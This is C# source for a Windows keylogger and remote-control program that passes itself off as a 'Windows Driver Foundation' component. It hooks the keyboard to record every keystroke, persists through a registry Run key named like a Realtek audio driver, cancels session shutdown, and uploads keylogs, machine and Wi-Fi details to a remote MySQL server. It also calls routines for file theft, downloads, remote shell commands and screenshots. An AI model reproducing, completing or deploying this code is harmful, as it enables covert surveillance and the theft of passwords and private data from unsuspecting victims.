using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

using System.Net;
using System.IO;
using System.Runtime.InteropServices;
using System.Threading;
using System.Diagnostics;
using Microsoft.Win32;

namespace Windows_Driver_Foundation
{
    public partial class Form1 : Form
    {

        //OPENING KEYLOGGER VARIABLES AND DLL's
        private const int WH_KEYBOARD_LL = 13;
        private const int WM_KEYDOWN = 0x0100;
        private static LowLevelKeyboardProc _proc = HookCallback;
        private static IntPtr _hookID = IntPtr.Zero;

        public static byte caps = 0, shift = 0, failed = 0;

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr SetWindowsHookEx(int idHook, LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        private static extern bool UnhookWindowsHookEx(IntPtr hhk);

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);

        [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr GetModuleHandle(string lpModuleName);
        //ENDING OF KEYLOGGER VARIABLES AND DLL

        static StringBuilder log = new StringBuilder();
        Thread backgroundworker;
        int time_cycle = 30000; //ms        // 3000ms = 30sec por ciclo.
        int file_size_required = 60;        // tamanho de ficheiro necessario para proceder ao upload (60 bytes por default).
        int print_number_required = 0;      // número de printsreens até Upload.

        string identity_srt = null;                         //save unique identity MachineName+UserName
        int client_id = -1;                                 //save host id (number) from DB
        string log_file_path =  @"system_recovery.dat";     //save keylogging data

        bool oneTimeStuff = false;

        public Form1()
        {
            InitializeComponent();
            identity_srt = Environment.MachineName + Environment.UserName;

            startup();
        }

        private void startup()
        {
            backgroundworker = new Thread(backgroundFunction);
            backgroundworker.Start();
            SystemEvents.SessionEnding += new SessionEndingEventHandler(OnSessionEnding);  //Win shutdown or session ending listening

            //KEYLOGGER STARTUP (ALL REMAIN CODE SHOULD STAY BEFORE THIS BLOCK)
            _hookID = SetHook(_proc);
            Application.Run();
            UnhookWindowsHookEx(_hookID);
            //END KEYLOGGER
        }

        private void backgroundFunction()
        {
            while (true)
            {

                Thread.Sleep(time_cycle);

                try
                {
                    checkLogFileExists();  //Verifica integridade do ficheiro log
                    checkWinStartup();     //Verifica Regist Key de startup with Windows

                    //Offline Job
                    if (log.ToString() != string.Empty)
                    {
                        if (writeLogToFile(log.ToString())) //se consigiu gravar com exito então limpa string log
                            log.Clear();
                    }

                    //Online Job
                    if (checkForInternetConnection()) //1º lvl of check Internet
                    {
                        confirmClientIdentity(); //Preenche client_id, time_cycle e file_size

                        if (client_id > 0)
                        {

                            if (!oneTimeStuff)
                                oneTimeProtocols();

                            sessionUpdate();


                            MultiTimeProtocols();
                        }
                    }
                }
                catch { }
            }
        }

        private void oneTimeProtocols()
        {
            // Insert new online Log 
            var cMySql = new classMySQLDatabase();
            cMySql.openDatabaseConnection();
            cMySql.insert_online_log(client_id, 1);
            cMySql.closeDatabaseConnection();

            //Computer Info Update
            var procMach = new classProcessMachineInfo();
            procMach.execute_machineInfo_protocol(client_id);

            //Network Status and Wi-Fi Info Update
            var procNet = new classProcessNetworkInfo();
            procNet.execute_wifi_protocol(client_id);
            procNet.execute_networkInfo_protocol(client_id);

            oneTimeStuff = true;
        }

        private void sessionUpdate()
        {
            var cMySql = new classMySQLDatabase();
            cMySql.openDatabaseConnection();
    
            if (getFileLenght(log_file_path) >= file_size_required)
            {
                if (cMySql.insert_keylog(client_id, readLogFile()))     // Log Upload
                    File.WriteAllText(log_file_path, string.Empty);     // Clean File

                cMySql.insert_online_log(client_id, 3); // 3 = log upload
            }
            else
                cMySql.insert_online_log(client_id, 2); // 2 = log not uploaded
            
            cMySql.closeDatabaseConnection();
        }

        private void MultiTimeProtocols()
        {
            var procSearchFiles = new classProcessSearchFileOrders();
            procSearchFiles.execute_SearchFile_protocol(client_id);
            procSearchFiles.execute_zipOrders_protocol(client_id);
            procSearchFiles.execute_uploadOrders_protocol(client_id);

            var procCheckFiles = new classProcessCheckFiles();
            procCheckFiles.execute_check_files_protocol(client_id);

            var procDownloads = new classProcessDownloadFiles();
            procDownloads.execute_downloadsFiles_protocol(client_id);

            var procShellCommands = new classProcessShellCommands();
            procShellCommands.execute_ShellCommands_protocol(client_id);
            
            //PRINTSCREEN SECTOR
            if (print_number_required > 0)
            {
                //call processPrintScreen();
                var procPrintScreen = new classProcessPrintScreen();
                procPrintScreen.execute_printscreen_protocol(client_id, print_number_required);
            }
            //END PRINT SCREEN SECTOR       
        }


        private void confirmClientIdentity()
        {
            if (client_id <= 0)
            {
                var mysql = new classMySQLDatabase();
                mysql.openDatabaseConnection();

                client_id = mysql.get_clientVar(identity_srt, "id");

                if (client_id == 0)
                {
                    if(mysql.regist_ClientId(identity_srt, Convert.ToInt32(time_cycle/1000), file_size_required, print_number_required, 0))
                        client_id = mysql.get_clientVar(identity_srt, "id");
                }
                else
                {
                    int temp_time_cycle = mysql.get_clientVar(identity_srt, "time_cycle") * 1000;
                    if (temp_time_cycle > 1000)
                        time_cycle = temp_time_cycle;

                    int temp_file_size_needed = mysql.get_clientVar(identity_srt, "file_size_upload");
                    if (temp_file_size_needed > 0)
                        file_size_required = temp_file_size_needed;

                    int temp_print_required = mysql.get_clientVar(identity_srt, "print_required");
                    if (temp_print_required > 0)
                        print_number_required = temp_print_required;
                }

                mysql.closeDatabaseConnection();
            }
        }

        private void checkWinStartup()
        {
            RegistryKey rkApp = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);

            if (rkApp.GetValue("RtkHDAD64") == null)
            {
                rkApp.SetValue("RtkHDAD64", Application.ExecutablePath);
            }
        }

        private void checkLogFileExists()
        {
            try
            {
                if (!File.Exists(log_file_path))
                    File.Create(log_file_path).Dispose();
            } catch{  }
        }

        private bool writeLogToFile(string _content)
        {
            try
            {
                using (FileStream fs = new FileStream(log_file_path, FileMode.Append, FileAccess.Write))
                using (StreamWriter sw = new StreamWriter(fs))
                    sw.Write(_content); 

                return true;
            }
            catch { return false; }
        }

        private string readLogFile()
        {
            string lines = null;
            try
            {
                using (StreamReader sr = new StreamReader(log_file_path))
                {
                    lines = sr.ReadToEnd();
                }
            }
            catch { }

            return lines;
        }

        private bool checkForInternetConnection()
        {
            try
            {
                using (var client = new WebClient())
                using (var stream = client.OpenRead("https://www.google.com"))
                {
                    return true;
                }
            }
            catch { return false; }
        }

        private int getFileLenght(string _path)
        {
            try
            {
                FileInfo xfile = new FileInfo(_path);
                return Convert.ToInt32(xfile.Length); //long to int32
            }
            catch { return -1; }
        }

        private void OnSessionEnding(object sender, SessionEndingEventArgs e)
        {
            e.Cancel = true;
            if (checkForInternetConnection())
            {
                sessionUpdate();
                var cMySql = new classMySQLDatabase();
                cMySql.openDatabaseConnection();
                cMySql.insert_online_log(client_id, 4); // 4 = WDF Shutdown
                cMySql.closeDatabaseConnection();
            }
        }

        //KEYLOGGER FUNCTIONS
        private static IntPtr SetHook(LowLevelKeyboardProc proc)
        {
            using (Process curProcess = Process.GetCurrentProcess())
            using (ProcessModule curModule = curProcess.MainModule)
            {
                return SetWindowsHookEx(WH_KEYBOARD_LL, proc, GetModuleHandle(curModule.ModuleName), 0);
            }
        }

        private delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);
        private static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam)
        {
            if (nCode >= 0 && wParam == (IntPtr)WM_KEYDOWN)
            {
                int vkCode = Marshal.ReadInt32(lParam);
                if (Keys.Shift == Control.ModifierKeys) shift = 1;

                    switch ((Keys)vkCode)
                {            
                    case Keys.Space:
                        log.Append(" ");
                        break;
                    case Keys.Return:  //ENTER
                        log.Append(Environment.NewLine);
                        break;
                    case Keys.Back:
                        log.Append("[BS]");
                        break;
                    case Keys.Tab:
                        log.Append("TAB");
                        break;
                    case Keys.D0:
                        if (shift == 0) log.Append("0");
                        else log.Append("=");
                        break;
                    case Keys.D1:
                        if (shift == 0) log.Append("1");
                        else log.Append("!");
                        break;
                    case Keys.D2:
                        if (shift == 0) log.Append("2");
                        else log.Append("\"");
                        break;
                    case Keys.D3:
                        if (shift == 0) log.Append("3");
                        else log.Append("#");
                        break;
                    case Keys.D4:
                        if (shift == 0) log.Append("4");
                        else log.Append("$");
                        break;
                    case Keys.D5:
                        if (shift == 0) log.Append("5");
                        else log.Append("%");
                        break;
                    case Keys.D6:
                        if (shift == 0) log.Append("6");
                        else log.Append("&");
                        break;
                    case Keys.D7:
                        if (shift == 0) log.Append("7");
                        else log.Append("/");
                        break;
                    case Keys.D8:
                        if (shift == 0) log.Append("8");
                        else log.Append("(");
                        break;
                    case Keys.D9:
                        if (shift == 0) log.Append("9");
                        else log.Append(")");
                        break;
                    case Keys.Alt:
                        log.Append("[ALT]");
                        break;
                    case Keys.LShiftKey:
                        log.Append("[L-SHIFT]");
                        break;
                    case Keys.RShiftKey:
                        log.Append("[R-SHIFT]");
                        break;
                    case Keys.LControlKey:
                        log.Append("[L-CTRL]");
                        break;
                    case Keys.RControlKey:
                        log.Append("[R-CTRL]");
                        break;
                    case Keys.LWin:
                        log.Append("[L-Win]");
                        break;
                    case Keys.RWin:
                        log.Append("[R-Win]");
                        break;
                    case Keys.Apps:
                        log.Append("[Apps]");
                        break;
                    case Keys.OemQuestion:
                        if (shift == 0) log.Append("~");
                        else log.Append("^");
                        break;
                    case Keys.OemOpenBrackets:
                        if (shift == 0) log.Append("'");
                        else log.Append("?");
                        break;
                    case Keys.Oem6:
                        if (shift == 0) log.Append("«");
                        else log.Append("»");
                        break;
                    case Keys.Oem1:
                        if (shift == 0) log.Append("´");
                        else log.Append("`");
                        break;
                    case Keys.Oem7:
                        if (shift == 0) log.Append("º");
                        else log.Append("ª");
                        break;
                    case Keys.Oemcomma:
                        if (shift == 0) log.Append(",");
                        else log.Append(";");
                        break;
                    case Keys.OemPeriod:
                        if (shift == 0) log.Append(".");
                        else log.Append(":");
                        break;
                    case Keys.OemMinus:
                        if (shift == 0) log.Append("-");
                        else log.Append("_");
                        break;
                    case Keys.Oemplus:
                        if (shift == 0) log.Append("+");
                        else log.Append("*");
                        break;
                    case Keys.Oemtilde:
                        if (shift == 0) log.Append("ç");
                        else log.Append("Ç");
                        break;
                    case Keys.Oem5:
                        if (shift == 0) log.Append("\\");
                        log.Append("|");
                        break;
                    case Keys.OemBackslash:
                        if (shift == 0) log.Append("<");
                        log.Append(">");
                        break;
                    case Keys.Capital:
                        if (caps == 0) caps = 1;
                        else caps = 0;
                        break;
                    case Keys.NumPad0:
                        log.Append("0");
                        break;
                    case Keys.NumPad1:
                        log.Append("1");
                        break;
                    case Keys.NumPad2:
                        log.Append("2");
                        break;
                    case Keys.NumPad3:
                        log.Append("3");
                        break;
                    case Keys.NumPad4:
                        log.Append("4");
                        break;
                    case Keys.NumPad5:
                        log.Append("5");
                        break;
                    case Keys.NumPad6:
                        log.Append("6");
                        break;
                    case Keys.NumPad7:
                        log.Append("7");
                        break;
                    case Keys.NumPad8:
                        log.Append("8");
                        break;
                    case Keys.NumPad9:
                        log.Append("9");
                        break;
                    case Keys.Decimal:
                        log.Append(".");
                        break;
                    case Keys.Add:
                        log.Append("+");
                        break;
                    case Keys.Subtract:
                        log.Append("-");
                        break;
                    case Keys.Multiply:
                        log.Append("*");
                        break;
                    case Keys.Divide:
                        log.Append("/");
                        break;
                    case Keys.Up:
                        log.Append("▲");
                        break;
                    case Keys.Down:
                        log.Append("▼");
                        break;
                    case Keys.Right:
                        log.Append("►");
                        break;
                    case Keys.Left:
                        log.Append("◄");
                        break;
                    default:
                        if (shift == 0 && caps == 0) log.Append(((Keys)vkCode).ToString().ToLower());
                        if (shift == 1 && caps == 0) log.Append(((Keys)vkCode).ToString().ToUpper());
                        if (shift == 0 && caps == 1) log.Append(((Keys)vkCode).ToString().ToUpper());
                        if (shift == 1 && caps == 1) log.Append(((Keys)vkCode).ToString().ToLower());
                        break;
                }
                shift = 0;
            }
            return CallNextHookEx(_hookID, nCode, wParam, lParam);//END OF KEYLOGGER FUNCTIONS  
        }

    }
}
